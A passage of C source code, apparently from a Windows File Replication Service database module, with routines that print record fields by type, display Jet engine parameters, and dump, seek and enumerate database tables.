        case DT_I2:

            FRS_INFO_PRINT("%8d\n",  *(SHORT *)pData);
            break;

        case DT_LONG:

            FRS_INFO_PRINT("%8d\n",  *(LONG *)pData);
            break;

        case DT_ULONG:

            FRS_INFO_PRINT("%08x\n",  *(ULONG *)pData);
            break;

        case DT_R4:

            FRS_INFO_PRINT("%08x\n",  *(ULONG *)pData);
            break;

        case DT_DOUBLE:

            FRS_INFO_PRINT("%016Lx\n",  *(LONGLONG *)pData);
            break;

        case DT_CURRENCY:

            FRS_INFO_PRINT("%8Ld\n",  *(LONGLONG *)pData);
            break;

        case DT_APDTIME:

            FRS_INFO_PRINT("%08x\n",  *(ULONG *)pData);
            break;

        case DT_ERROR:

            FRS_INFO_PRINT("%08x\n",  *(ULONG *)pData);
            break;

        case DT_BOOL:

            FRS_INFO_PRINT("%08x\n",  *(ULONG *)pData);
            break;

        case DT_OBJECT:

            FRS_INFO_PRINT("%08x\n",  *(ULONG *)pData);
            break;

        case DT_I8:

            FRS_INFO_PRINT("%8Ld\n",  *(LONGLONG *)pData);
            break;

        case DT_X8:
        case DT_USN:

            FRS_INFO_PRINT2( "%08x %08x\n", *(((ULONG *) pData)+1), *(ULONG *)pData);
            break;

        case DT_STRING8:

            if (Len == 0) {
                FRS_INFO_PRINT("%s\n", "<null len string>");
            } else

            if ((((CHAR *)pData)[Len-1]) != '\0') {
                FRS_INFO_PRINT("%s\n", "<not null terminated>");
            } else {
                FRS_INFO_PRINT("%s\n",  (CHAR *)pData);
            }
            break;

        case DT_UNICODE:
        case DT_FILENAME:
        case DT_FILE_LIST:
        case DT_DIR_PATH:

            if (Len == 0) {
                FRS_INFO_PRINT("%s\n", "<null len string>");
            } else

            if ((((WCHAR *)pData)[(Len/sizeof(WCHAR))-1]) != UNICODE_NULL) {
                FRS_INFO_PRINT("%s\n", "<not null terminated>");
            } else {
                FRS_INFO_PRINT("%ws\n",  (WCHAR *)pData);
            }

            break;

        case DT_FILETIME:

            FileTimeToString((PFILETIME) pData, TimeStr);
            FRS_INFO_PRINT("%s\n", TimeStr);
            break;

        case DT_GUID:

            GuidToStr((GUID *) pData, GuidStr);
            FRS_INFO_PRINT("%s\n",  GuidStr);
            break;

        case DT_BINARY:

            FRS_INFO_PRINT("%08x\n",  *(ULONG *)pData);
            break;

        case DT_OBJID:

            GuidToStr((GUID *) pData, GuidStr);
            FRS_INFO_PRINT("%s\n",  GuidStr);
            break;

        case DT_FSVOLINFO:

            Fsvi = (PFILE_FS_VOLUME_INFORMATION) pData;

            FRS_INFO_PRINT4("%ws (%d), %s, VSN: %08X, VolCreTim: ",
                           Fsvi->VolumeLabel,
                           Fsvi->VolumeLabelLength,
                           (Fsvi->SupportsObjects ? "(obj)" : "(no-obj)"),
                           Fsvi->VolumeSerialNumber);

            FileTimeToString((PFILETIME) &Fsvi->VolumeCreationTime, TimeStr);
            FRS_INFO_PRINT("%s\n", TimeStr);
            break;

        case DT_IDT_FLAGS:
            //
            // Decode and print the flags field in the IDTable record.
            //
            FrsFlagsToStr(*(ULONG *)pData, IDRecFlagNameTable, sizeof(FlagBuffer), FlagBuffer);
            FRS_INFO_PRINT2("%08x Flags [%s]\n", *(ULONG *)pData, FlagBuffer);
            break;

        case DT_COCMD_FLAGS:
            //
            // Decode and print the flags field in the ChangeOrder record.
            //
            FrsFlagsToStr(*(ULONG *)pData, CoFlagNameTable, sizeof(FlagBuffer), FlagBuffer);
            FRS_INFO_PRINT2("%08x Flags [%s]\n", *(ULONG *)pData, FlagBuffer);

            break;

        case DT_USN_FLAGS:
            //
            // Decode and print the USN Reason field in the USN Record.
            //
            FrsFlagsToStr(*(ULONG *)pData, UsnReasonNameTable, sizeof(FlagBuffer), FlagBuffer);
            FRS_INFO_PRINT2("%08x Flags [%s]\n", *(ULONG *)pData, FlagBuffer);

            break;

        case DT_CXTION_FLAGS:
            //
            // Decode and print the flags field in the connection record.
            //
            FrsFlagsToStr(*(ULONG *)pData, CxtionFlagNameTable, sizeof(FlagBuffer), FlagBuffer);
            FRS_INFO_PRINT2("%08x Flags [%s]\n", *(ULONG *)pData, FlagBuffer);
            break;

        case DT_FILEATTR:
            //
            // Decode and print the file attributes field in IDTable and ChangeOrder records.
            //
            FrsFlagsToStr(*(ULONG *)pData, FileAttrFlagNameTable, sizeof(FlagBuffer), FlagBuffer);
            FRS_INFO_PRINT2("%08x Flags [%s]\n", *(ULONG *)pData, FlagBuffer);
            break;

        case DT_COSTATE:

            ULong = *(ULONG *)pData;
            FRS_INFO_PRINT2("%08x  CO STATE:  %s\n",
                           ULong,
                           (ULong <= IBCO_MAX_STATE) ? IbcoStateNames[ULong] : "INVALID STATE");
            break;

        case DT_COCMD_IFLAGS:
            //
            // Decode and print the Iflags field in the ChangeOrder record.
            //
            FrsFlagsToStr(*(ULONG *)pData, CoIFlagNameTable, sizeof(FlagBuffer), FlagBuffer);
            FRS_INFO_PRINT2("%08x Flags [%s]\n", *(ULONG *)pData, FlagBuffer);

            break;

        case DT_CO_LOCN_CMD:
            //
            // Decode and print the change order location command.
            //
            ULong = *(ULONG *)pData;
            k = ((PCO_LOCATION_CMD)(pData))->Command;

            FRS_INFO_PRINT3("%08x  D/F %d   %s\n", ULong,
                           ((PCO_LOCATION_CMD)(pData))->DirOrFile,
                           (k <= CO_LOCATION_NUM_CMD) ? CoLocationNames[k] : "Invalid Location Cmd");
            break;

        case DT_REPLICA_ID:
            //
            // Translate the replica ID number to a name.
            //
            ULong = *(ULONG *)pData;
            WStr = L"???";
#if 0
            //
            // Note: can't get the lock below since we will hang.
            // Need another way to get the replica name.
            //
            Replica = RcsFindReplicaById(ULong);
            if ((Replica != NULL) &&
                (Replica->ReplicaName != NULL) &&
                (Replica->ReplicaName->Name != NULL)){
                WStr = Replica->ReplicaName->Name;
            }
#endif
            FRS_INFO_PRINT2("%d  [%ws]\n", ULong, WStr);
            break;

        case DT_CXTION_GUID:
            //
            // Translate inbound cxtion guid to string.
            // (need replica ptr to look up the cxtion).
            //
            GuidToStr((GUID *) pData, GuidStr);
            FRS_INFO_PRINT("%s\n", GuidStr);
            break;


        case DT_IDT_EXTENSION:

            if (Len == 0) {
                FRS_INFO_PRINT("%s\n", "<Zero len string>");
                break;
            }

            DbsIPrintExtensionField(pData, InfoTable);

            break;


        case DT_COCMD_EXTENSION:

            if (Len == 0) {
                FRS_INFO_PRINT("%s\n", "<Zero len string>");
                break;
            }

            DbsIPrintExtensionField(pData, InfoTable);

            break;


        default:

            FRS_INFO_PRINT("<invalid type: %d>\n",  DataType);


        }  // end switch

    }  // end loop
}



VOID
DbsDisplayJetParams(
    IN PJET_SYSTEM_PARAMS Jsp,
    IN ULONG ActualLength
    )
/*++

Routine Description:

    This routine displays the contents of the Jet system parameters struct.

Arguments:

    JetSystemParams   -- ptr to param struct.

Return Value:

    none.

--*/
{
#undef DEBSUB
#define DEBSUB "DbsDisplayJetParams:"

    PJET_PARAM_ENTRY Jpe;


    if (ActualLength != sizeof(JET_SYSTEM_PARAMS)) {
        DPRINT1(1, "++ JetSystemParameters: length error: %d\n", ActualLength);
        return;
    }

    if (Jsp == NULL) {
        DPRINT(1, "++ JetSystemParameters: null ptr\n");
        return;
    }

    if (Jsp->ParamEntry[MAX_JET_SYSTEM_PARAMS-1].ParamType != JPARAM_TYPE_LAST) {
        DPRINT(1, "++ JetSystemParameters: ParamEntry[MAX_JET_SYSTEM_PARAMS-1].ParamType != JPARAM_TYPE_LAST\n");
    }

    Jpe = Jsp->ParamEntry;

    while (Jpe->ParamType != JPARAM_TYPE_LAST) {

        if (Jpe->ParamType == JPARAM_TYPE_STRING) {

            DPRINT2(4, "++ %-24s : %s\n", Jpe->ParamName, ((PCHAR)Jsp)+Jpe->ParamValue);

        } else if (Jpe->ParamType == JPARAM_TYPE_LONG) {

            DPRINT2(4, "++ %-24s : %d\n", Jpe->ParamName, Jpe->ParamValue);

        }

        Jpe += 1;
    }
}



JET_ERR
DbsDumpTableWorker(
    IN PTHREAD_CTX   ThreadCtx,
    IN PTABLE_CTX    TableCtx,
    IN PVOID         Record,
    IN PVOID         Context
)
/*++

Routine Description:

    This is a worker function passed to FrsEnumerateTable().  Each time
    it is called it dumps the current record in TableCtx.

Arguments:

    ThreadCtx - Needed to access Jet.  (Not used).
    TableCtx - A ptr to a DIRTable context struct.
    Record - A ptr to a DIRTable record.  (Not used).
    Context - A ptr to the Replica set we are loading data for.  (Not used).

Thread Return Value:

    A Jet error status.  Success means call us with the next record.
    Failure means don't call again and pass our status back to the
    caller of FrsEnumerateTable().

--*/
{
#undef DEBSUB
#define DEBSUB "DbsDumpTableWorker:"

    DBS_DISPLAY_RECORD_SEV(5, TableCtx, TRUE);

    return JET_errSuccess;
}


JET_ERR
DbsDumpTable(
    IN PTHREAD_CTX   ThreadCtx,
    IN PTABLE_CTX    TableCtx,
    IN ULONG         RecordIndex
    )

/*++

Routine Description:

    This function opens the table specified by the table context
    (if it's not already open) and dumps the table based on the index
    specified.

    If the TableCtx->Tid field is NOT JET_tableidNil then
    we assume it is good FOR THIS SESSION and do not reopen the table.

    Note:  NEVER use table IDs across sessions or threads.

Arguments:

    ThreadCtx  - Provides the Jet Sesid and Dbid.

    TableCtx   - The table context uses the following:

            JTableCreate - The table create structure which provides info
                           about the columns that were created in the table.

            JRetColumn - The JET_RETRIEVECOLUMN struct array to tell
                         Jet where to put the data.

            ReplicaNumber - The id number of the replica this table belongs too.

    RecordIndex - The index to use when accessing the table.  From the index
                  enum list for the table in schema.h.

Return Value:

    Jet Error Status.

--*/
{
#undef DEBSUB
#define DEBSUB "DbsDumpTable:"

    JET_ERR    jerr, jerr1;
    JET_SESID   Sesid;
    JET_TABLEID  Tid;
    NTSTATUS   Status;
    ULONG      ReplicaNumber;
    JET_TABLEID  FrsOpenTableSaveTid;   // for FrsOpenTableMacro DEBUG

    TABLE_CTX  DumpTableCtxState;
    PTABLE_CTX  DumpTableCtx = &DumpTableCtxState;
    CHAR TableName[JET_cbNameMost];


    Sesid          = ThreadCtx->JSesid;
    ReplicaNumber  = TableCtx->ReplicaNumber;

    //
    // Allocate a new table context using the table type of the caller.
    //
    DumpTableCtx->TableType = TABLE_TYPE_INVALID;
    Status = DbsAllocTableCtx(TableCtx->TableType, DumpTableCtx);

    //
    // Open the table, if it's not already open. Check the session id for match.
    //
    jerr = DBS_OPEN_TABLE(ThreadCtx, DumpTableCtx, ReplicaNumber, TableName, &Tid);
    CLEANUP1_JS(0, "ERROR - FrsOpenTable (%s) :", TableName, jerr, RETURN);

    jerr = FrsEnumerateTable(ThreadCtx, DumpTableCtx, RecordIndex, DbsDumpTableWorker, NULL);

    //
    // Close the table and reset DumpTableCtx Tid and Sesid.   Macro writes 1st arg.
    //
RETURN:
    DbsCloseTable(jerr1, Sesid, DumpTableCtx);

    //
    // Free the table context.
    //
    DbsFreeTableCtx(DumpTableCtx, 1);

    return jerr;
}



JET_ERR
DbsTableMoveFirst(
    IN PTHREAD_CTX   ThreadCtx,
    IN PTABLE_CTX    TableCtx,
    IN ULONG         ReplicaNumber,
    IN ULONG         RecordIndex
    )
/*++

Routine Description:

    This routine opens a table and moves the cursor to the first record
    specified by the RecordIndex.

Arguments:

    ThreadCtx - A thread context for accessing Jet.
    TableCtx - A ptr to the Table context of the open table to enumerate.
    ReplicaNumber - The replica ID.
    RecordIndex - The ID number for the record index to use.

Thread Return Value:

    Jet error status.
        JET_errNoCurrentRecord means the table is empty.
        JET_errSuccess means the table is not empty.

--*/

{
#undef DEBSUB
#define DEBSUB "DbsTableMoveFirst:"

    JET_ERR            jerr, jerr1;
    JET_SESID          Sesid;
    JET_TABLEID        Tid;
    JET_TABLEID        FrsOpenTableSaveTid;   // for FrsOpenTableMacro DEBUG
    PJET_TABLECREATE   JTableCreate;
    PJET_INDEXCREATE   JIndexDesc;
    PCHAR              IndexName;
    CHAR               TableName[JET_cbNameMost];


    Sesid          = ThreadCtx->JSesid;

    Tid            = TableCtx->Tid;
    JTableCreate   = TableCtx->pJetTableCreate;
    JIndexDesc     = JTableCreate->rgindexcreate;

    //
    // Get the index name based on RecordIndex argument.
    //
    IndexName      = JIndexDesc[RecordIndex].szIndexName;

    //
    // Open the table if it's not already open and check the session id for match.
    //
    jerr = DBS_OPEN_TABLE(ThreadCtx, TableCtx, ReplicaNumber, TableName, &Tid);
    CLEANUP1_JS(0, "FrsOpenTable (%s) :", TableName, jerr, RETURN);

    //
    // Use the specified index.
    //
    jerr = JetSetCurrentIndex2(Sesid, Tid, IndexName, JET_bitMoveFirst);
    CLEANUP1_JS(0, "JetSetCurrentIndex (%s) :", TableName, jerr, RETURN);

    //
    // Move to the first record.
    //
    jerr = JetMove(Sesid, Tid, JET_MoveFirst, 0);
    DPRINT_JS(4, "JetSetCurrentIndex error:", jerr);

RETURN:
    return jerr;
}



ULONG
DbsTableMoveToRecord(
    IN PTHREAD_CTX   ThreadCtx,
    IN PTABLE_CTX    TableCtx,
    IN ULONG         RecordIndex,
    IN ULONG         MoveArg
    )
/*++

Routine Description:

    This routine moves the cursor to the record
    specified by the RecordIndex and MoveArg.

Arguments:

    ThreadCtx - A thread context for accessing Jet.
    TableCtx - A ptr to the Table context of the open table to enumerate.
    RecordIndex - The ID number for the record index to use.
    MoveArg - One of FrsMoveFirst, FrsMovePrevious, FrsMoveNext, FrsMoveLast

Return Value:

    FrsErrorStatus         JetErrorStatus

    FrsErrorNotFound    JET_errRecordNotFound
    FrsErrorNotFound    JET_errNoCurrentRecord
    FrsErrorNotFound    JET_wrnTableEmpty
    FrsErrorSuccess     JET_errSuccess
--*/

{
#undef DEBSUB
#define DEBSUB "DbsTableMoveToRecord:"

    JET_ERR            jerr, jerr1;
    JET_SESID          Sesid;
    JET_TABLEID        Tid;
    PJET_TABLECREATE   JTableCreate;
    PJET_INDEXCREATE   JIndexDesc;
    PCHAR              IndexName;


    Sesid          = ThreadCtx->JSesid;
    Tid            = TableCtx->Tid;
    JTableCreate   = TableCtx->pJetTableCreate;
    JIndexDesc     = JTableCreate->rgindexcreate;

    //
    // Get the index name based on RecordIndex argument.
    //
    IndexName      = JIndexDesc[RecordIndex].szIndexName;

    //
    // Use the specified index.
    //
    jerr = JetSetCurrentIndex2(Sesid, Tid, IndexName, JET_bitMoveFirst);
    if (!JET_SUCCESS(jerr)) {
        goto ERROR_RETURN;
    }

    FRS_ASSERT((MoveArg == FrsMoveFirst)    ||
               (MoveArg == FrsMovePrevious) ||
               (MoveArg == FrsMoveNext)     ||
               (MoveArg == FrsMoveLast));

    //
    // Move to requested record.
    //
    jerr = JetMove(Sesid, Tid, MoveArg, 0);
    if (!JET_SUCCESS(jerr)) {
        goto ERROR_RETURN;
    }

    return FrsErrorSuccess;

ERROR_RETURN:

    if ((jerr == JET_errRecordNotFound)  ||
        (jerr == JET_errNoCurrentRecord) ||
        (jerr == JET_wrnTableEmpty)) {
        return  FrsErrorNotFound;
    } else {
        DPRINT_JS(0, "ERROR:", jerr);
        return DbsTranslateJetError(jerr, FALSE);
    }
}

JET_ERR
DbsEnumerateTable2(
    IN PTHREAD_CTX   ThreadCtx,
    IN PTABLE_CTX    TableCtx,
    IN ULONG         RecordIndex,
    IN PENUMERATE_TABLE_ROUTINE RecordFunction,
    IN PVOID         Context,
    IN PENUMERATE_TABLE_PREREAD PreReadFunction
    )
/*++

Routine Description:

    This routine fetches each record of the open table specified by the
    table context and calls the supplied RecordFunction().  The record
    sequence is governed by the RecordIndex ID value.

    IMPROVEMENT: Add another return parameter on the RecordFunction
    (or use status) that tells us to apply an update to the table.
    The RecordFunction has modified some data fields.  Could pass
    back a vector of field IDs that need to be written back to Jet.
    This could be used to walk thru an IDTable and update all the
    FIDs.

Arguments:

    ThreadCtx - A thread context for accessing Jet.
    TableCtx - A ptr to the Table context of the open table to enumerate.
    RecordIndex - The ID number for the record index to use in the enumeration.
    RecordFunction - The function to call for each record in the table.
    Context - A context ptr to pass through to the RecordFunction.
    PreReadFunction - If non-Null this function is called before each DB read.
                      It can be used to change the record address or set up
                      some synchronization.

Thread Return Value:

    Jet error status.

    If the RecordFunction returns a JET_errWriteConflict value then we retry
    the read operation.
    If the RecordFunction returns any other  NON SUCCESS value
    this value is returned to our caller.

--*/

{
#undef DEBSUB
#define DEBSUB "DbsEnumerateTable2:"

    JET_SESID            Sesid;
    PJET_TABLECREATE     JTableCreate;
    PJET_RETRIEVECOLUMN  JRetColumn;
    JET_TABLEID          Tid;
    PJET_INDEXCREATE     JIndexDesc;
    ULONG                NumberColumns;
    PCHAR                IndexName;
    JET_ERR              jerr, jerr1;
    ULONG                FStatus;
    LONG                 Trips;

    Sesid          = ThreadCtx->JSesid;

    JTableCreate   = TableCtx->pJetTableCreate;
    JRetColumn     = TableCtx->pJetRetCol;
    Tid            = TableCtx->Tid;

    JIndexDesc     = JTableCreate->rgindexcreate;
    NumberColumns  = JTableCreate->cColumns;

    //
    // Get the index name based on RecordIndex argument.
    //
    IndexName      = JIndexDesc[RecordIndex].szIndexName;

    //
    // Use the specified index.
    //
    jerr = JetSetCurrentIndex2(Sesid, Tid, IndexName, JET_bitMoveFirst);
    if (!JET_SUCCESS(jerr)) {
        DPRINT_JS(0, "JetSetCurrentIndex:", jerr);
        return jerr;
    }

    //
    // Initialize the JetSet/RetCol arrays and data record buffer addresses
    // to read and write the fields of the ConfigTable records into ConfigRecord.
    //
    DbsSetJetColSize(TableCtx);
    DbsSetJetColAddr(TableCtx);

    //
    // Allocate the storage for the variable length fields in the record and
    // update the JetSet/RetCol arrays appropriately.
    //
    DbsAllocRecordStorage(TableCtx);

    //
    // Move to the first record.
    //
    jerr = JetMove(Sesid, Tid, JET_MoveFirst, 0);

    //
    // If the record is not there then return.
    //
    if (jerr == JET_errNoCurrentRecord ) {
        DPRINT(4, "JetMove - empty table\n");
        return JET_wrnTableEmpty;
    }

    if (!JET_SUCCESS(jerr)) {
        DPRINT_JS(0, "JetMove error:", jerr);
        return jerr;
    }

    while( JET_SUCCESS(jerr) ) {

        Trips = 10000;
RETRY_READ:

        //
        // Call the PreRead Function if supplied.
        //
        if (PreReadFunction != NULL) {
            jerr = (PreReadFunction)(ThreadCtx, TableCtx, Context);
            if (!JET_SUCCESS(jerr)) {
                break;
            }
        }

        FStatus = DbsTableRead(ThreadCtx, TableCtx);
        if (!FRS_SUCCESS(FStatus)) {
            DPRINT_FS(0, "Error - can't read selected record.", FStatus);
            jerr = JET_errRecordNotFound;
            DBS_DISPLAY_RECORD_SEV(1, TableCtx, TRUE);
        } else {
            //
            // Call the RecordFunction to process the record data.
            //
            jerr = (RecordFunction)(ThreadCtx,
                                    TableCtx,
                                    TableCtx->pDataRecord,
                                    Context);

            if ((jerr == JET_errInvalidObject) && (--Trips > 0)) {
                goto RETRY_READ;
            }

            FRS_ASSERT(Trips != 0);

            if (!JET_SUCCESS(jerr)) {
                break;
            }
        }

        //
        // go to next record in table.
        //
        jerr = JetMove(Sesid, Tid, JET_MoveNext, 0);
        //
        // If the record is not there then return.
        //
        if (jerr == JET_errNoCurrentRecord ) {
            DPRINT(4, "JetMove - end of table\n");
            break;
        }

        if (!JET_SUCCESS(jerr)) {
            DPRINT_JS(0, "JetMove error:", jerr);
            break;
        }
    }

    return jerr;
}


JET_ERR
DbsEnumerateTableFrom(
    IN PTHREAD_CTX   ThreadCtx,
    IN PTABLE_CTX    TableCtx,
    IN ULONG         RecordIndex,
    IN PVOID         KeyValue,
    IN INT           ScanDirection,
    IN PENUMERATE_TABLE_ROUTINE RecordFunction,
    IN PVOID         Context,
    IN PENUMERATE_TABLE_PREREAD PreReadFunction
    )
/*++

Routine Description:

    This routine fetches each record of the open table specified by the
    table context and calls the supplied RecordFunction().  The record
    sequence is governed by the RecordIndex ID value. The KeyValue if present
    specifies the point to seek to before starting the enumeration.

Arguments:

    ThreadCtx - A thread context for accessing Jet.
    TableCtx - A ptr to the Table context of the open table to enumerate.
    RecordIndex - The ID number for the record index to use in the enumeration.
    KeyValue - If supplied specifies the record to scan to before starting enumeration.
    ScanDirection - 1  - Scan towards the end of table.
                    -1 - Scan towards begining of table.
                    0  - Do not scan, just return the record at the location.
    RecordFunction - The function to call for each record in the table.
    Context - A context ptr to pass through to the RecordFunction.
    PreReadFunction - If non-Null this function is called before each DB read.
                      It can be used to change the record address or set up
                      some synchronization.

Thread Return Value:

    Jet error status.

    If the RecordFunction returns a JET_errWriteConflict value then we retry
    the read operation.
    If the RecordFunction returns any other  NON SUCCESS value
    this value is returned to our caller.

--*/

{
#undef DEBSUB
#define DEBSUB "DbsEnumerateTableFrom:"

    JET_SESID            Sesid;
    PJET_TABLECREATE     JTableCreate;
    PJET_RETRIEVECOLUMN  JRetColumn;
    JET_TABLEID          Tid;
    PJET_INDEXCREATE     JIndexDesc;
    ULONG                NumberColumns;
    PCHAR                IndexName;
    PCHAR                BaseTableName;
    JET_ERR              jerr, jerr1;
    ULONG                FStatus;
    LONG                 Trips;
    CHAR                 TableName[JET_cbNameMost];

    Sesid          = ThreadCtx->JSesid;

    JTableCreate   = TableCtx->pJetTableCreate;
    JRetColumn     = TableCtx->pJetRetCol;
    Tid            = TableCtx->Tid;

    JIndexDesc     = JTableCreate->rgindexcreate;
    NumberColumns  = JTableCreate->cColumns;
    BaseTableName  = JTableCreate->szTableName;

    //
    // Get the index name based on RecordIndex argument.
    //
    IndexName      = JIndexDesc[RecordIndex].szIndexName;

    //
    // Use the specified index.
    //
    jerr = JetSetCurrentIndex2(Sesid, Tid, IndexName, JET_bitMoveFirst);
    if (!JET_SUCCESS(jerr)) {
        DPRINT_JS(0, "JetSetCurrentIndex:", jerr);
        return jerr;
    }

    //
    // Initialize the JetSet/RetCol arrays and data record buffer addresses
    // to read and write the fields of the ConfigTable records into ConfigRecord.
    //
    DbsSetJetColSize(TableCtx);
    DbsSetJetColAddr(TableCtx);

    //
    // Allocate the storage for the variable length fields in the record and
    // update the JetSet/RetCol arrays appropriately.
    //
    DbsAllocRecordStorage(TableCtx);


    if (KeyValue == NULL) {

        //
        // Specific record not supplied. Move to start or end of table.
        //

        if (ScanDirection == 1) {
            //
            // Start scan from first record.
            //
            jerr = JetMove(Sesid, Tid, JET_MoveFirst, 0);
        } else if (ScanDirection == -1) {
            //
            // Start scan from last record.
            //
            jerr = JetMove(Sesid, Tid, JET_MoveLast, 0);
        } else {
            DPRINT(4, "JetMove - invalid Scan Direction\n");
            return JET_errInvalidOperation;
        }

        //
        // If the record is not there then return.
        //
        if (jerr == JET_errNoCurrentRecord ) {
            DPRINT(4, "JetMove - empty table\n");
            return JET_wrnTableEmpty;
        }

        if (!JET_SUCCESS(jerr)) {
            DPRINT_JS(0, "JetMove error:", jerr);
            return jerr;
        }
    } else {
        //
        // Key value is supplied. Use it to move to the correct location.
        //
        //
        // Make the key value for the target record.
        //
        jerr = DbsMakeKey(Sesid, Tid, IndexName, &KeyValue);
        if (!JET_SUCCESS(jerr)) {
            if (jerr == JET_errIndexInvalidDef) {
                sprintf(TableName, "%s%05d", BaseTableName, TableCtx->ReplicaNumber);
                DPRINT2(0, "++ Schema error - Invalid keycode on index (%s) accessing table (%s)\n",
                       IndexName, TableName);
            }
            DbsTranslateJetError(jerr, TRUE);
            return jerr;
        }

        //
        // Seek to the record.
        //
        jerr = JetSeek(Sesid, Tid, (ScanDirection == 1)?
                                      JET_bitSeekGE
                                   : ((ScanDirection == -1)?
                                      JET_bitSeekLE
                                   :
                                      JET_bitSeekEQ));

        //
        // If the record is not there then return.
        //
        if (!JET_SUCCESS(jerr)) {
            DPRINT_JS(0, "JetMove error:", jerr);
            return jerr;
        }

    }


    while( JET_SUCCESS(jerr) ) {

        Trips = 10000;
RETRY_READ:

        //
        // Call the PreRead Function if supplied.
        //
        if (PreReadFunction != NULL) {
            jerr = (PreReadFunction)(ThreadCtx, TableCtx, Context);
            if (!JET_SUCCESS(jerr)) {
                break;
            }
        }

        FStatus = DbsTableRead(ThreadCtx, TableCtx);
        if (!FRS_SUCCESS(FStatus)) {
            DPRINT_FS(0, "Error - can't read selected record.", FStatus);
            jerr = JET_errRecordNotFound;
            DBS_DISPLAY_RECORD_SEV(1, TableCtx, TRUE);
        } else {
            //
            // Call the RecordFunction to process the record data.
            //
            jerr = (RecordFunction)(ThreadCtx,
                                    TableCtx,
                                    TableCtx->pDataRecord,
                                    Context);

            if ((jerr == JET_errInvalidObject) && (--Trips > 0)) {
                goto RETRY_READ;
            }

            FRS_ASSERT(Trips != 0);

            if (!JET_SUCCESS(jerr)) {
                break;
            }
        }

        //
        // go to next record in table.
        //
        if (ScanDirection == 1) {
            jerr = JetMove(Sesid, Tid, JET_MoveNext, 0);
        } else if (ScanDirection == -1) {
            jerr = JetMove(Sesid, Tid, JET_MovePrevious, 0);
        } else {
            jerr = JET_errNoCurrentRecord;
        }

        //
        // If the record is not there then return.
        //
        if (jerr == JET_errNoCurrentRecord ) {
            DPRINT(4, "JetMove - end of table\n");
            break;
        }

        if (!JET_SUCCESS(jerr)) {
            DPRINT_JS(0, "JetMove error:", jerr);
            break;
        }
    }

    return jerr;
}


JET_ERR
DbsEnumerateOutlogTable(
    IN PTHREAD_CTX   ThreadCtx,
    IN PTABLE_CTX    TableCtx,
    IN ULONG         RecordIndexLimit,
    IN PENUMERATE_OUTLOGTABLE_ROUTINE RecordFunction,
    IN PVOID         Context
    )
/*++

Routine Description:

    This routine fetches each record of the open outlog table specified by the
    table context and calls the supplied RecordFunction().  The record
    sequence is the sequence number field.

    The enumeration is sequential starting from the lowest record
    in the table and stopping at the specified limit (unless the
    RecordFunction() stops us sooner).  If a record is not found then
    a null value for the record pointer is passed to the function.

    IMPROVEMENT: Add another return parameter on the RecordFunction
    (or use status) that tells us to apply an update to the table.
    The RecordFunction has modified some data fields.  Could pass
    back a vector of field IDs that need to be written back to Jet.
    This could be used to walk thru an IDTable and update all the
    FIDs.

Arguments:

    ThreadCtx - A thread context for accessing Jet.
    TableCtx - A ptr to the Table context of the open table to enumerate.
    RecordIndexLimit - The index limit at which to stop the enumeration.
    RecordFunction - The function to call for each record in the table.
    Context - A context ptr to pass through to the RecordFunction.

Thread Return Value:

    Jet error status.

    If the RecordFunction returns a JET_errWriteConflict value then we retry
    the read operation.
    If the RecordFunction returns any other  NON SUCCESS value
    this value is returned to our caller.

--*/

{
#undef DEBSUB
#define DEBSUB "DbsEnumerateOutlogTable:"

    JET_SESID            Sesid;
    PJET_TABLECREATE     JTableCreate;
    PJET_RETRIEVECOLUMN  JRetColumn;
    JET_TABLEID          Tid;
    PJET_INDEXCREATE     JIndexDesc;
    ULONG                NumberColumns;
    PCHAR                IndexName;
    JET_ERR              jerr, jerr1;
    ULONG                FStatus;
    LONG                 Trips;
    PCHANGE_ORDER_COMMAND CoCmd;
    ULONG                OutLogSeqNumber = 0;


    Sesid          = ThreadCtx->JSesid;

    JTableCreate   = TableCtx->pJetTableCreate;
    JRetColumn     = TableCtx->pJetRetCol;
    Tid            = TableCtx->Tid;

    JIndexDesc     = JTableCreate->rgindexcreate;
    NumberColumns  = JTableCreate->cColumns;

    //
    // Get the index name based on Outlog sequence number.
    //
    IndexName      = JIndexDesc[OLSequenceNumberIndexx].szIndexName;

    //
    // Use the specified index.
    //
    jerr = JetSetCurrentIndex2(Sesid, Tid, IndexName, JET_bitMoveFirst);
    if (!JET_SUCCESS(jerr)) {
        DPRINT_JS(0, "JetSetCurrentIndex error:", jerr);
        return jerr;
    }

    //
    // Initialize the JetSet/RetCol arrays and data record buffer addresses
    // to read and write the fields of the ConfigTable records into ConfigRecord.
    //
    DbsSetJetColSize(TableCtx);
    DbsSetJetColAddr(TableCtx);

    //
    // Allocate the storage for the variable length fields in the record and
    // update the JetSet/RetCol arrays appropriately.
    //
    DbsAllocRecordStorage(TableCtx);

    //
    // Move to the first record.
    //
    jerr = JetMove(Sesid, Tid, JET_MoveFirst, 0);

    //
    // If the record is not there then return.
    //
    if (jerr == JET_errNoCurrentRecord ) {
        DPRINT(4, "JetMove - empty table\n");
        return JET_wrnTableEmpty;
    }

    if (!JET_SUCCESS(jerr)) {
        DPRINT_JS(0, "JetMove error:", jerr);
        return jerr;
    }

    FStatus = FrsErrorSuccess;
    while( OutLogSeqNumber < RecordIndexLimit ) {

        Trips = 10;
RETRY_READ:


        if (FRS_SUCCESS(FStatus)) {
            //
            // Read the record.
            //
            FStatus = DbsTableRead(ThreadCtx, TableCtx);
            if (!FRS_SUCCESS(FStatus)) {
                goto RETRY_READ;
            }
            CoCmd = (PCHANGE_ORDER_COMMAND) TableCtx->pDataRecord;
            OutLogSeqNumber = CoCmd->SequenceNumber;
        } else

        if (FStatus == FrsErrorNotFound) {
            //
            // No record at this sequence number.  Bump the number and
            // call record function with a null record.
            //
            OutLogSeqNumber += 1;
            CoCmd = NULL;
        } else {
            DPRINT1_FS(0, "Error - reading selected record. jerr = %d,", jerr, FStatus);
            jerr = JET_errRecordNotFound;
            break;
        }


        //
        // Call the RecordFunction to process the record data.
        //
        jerr = (RecordFunction)(ThreadCtx, TableCtx, CoCmd, Context, OutLogSeqNumber);

        if ((jerr == JET_errInvalidObject) && (--Trips > 0)) {
            goto RETRY_READ;
        }

        FRS_ASSERT(Trips != 0);

        if (!JET_SUCCESS(jerr)) {
            break;
        }

        //
        // go to next record in table.
        //
        jerr = JetMove(Sesid, Tid, JET_MoveNext, 0);

        if (jerr == JET_errNoCurrentRecord) {
            FStatus = FrsErrorNotFound;
        } else {
            FStatus = DbsTranslateJetError(jerr, FALSE);
        }

    }

    return jerr;
}





ULONG
DbsRequestSaveMark(
    PVOLUME_MONITOR_ENTRY pVme,
    BOOL                  Wait
    )
/*++
Routine Description:

     Capture current Journal USN and Volume Sequence Number to save with
     the active replica sets using this journal.

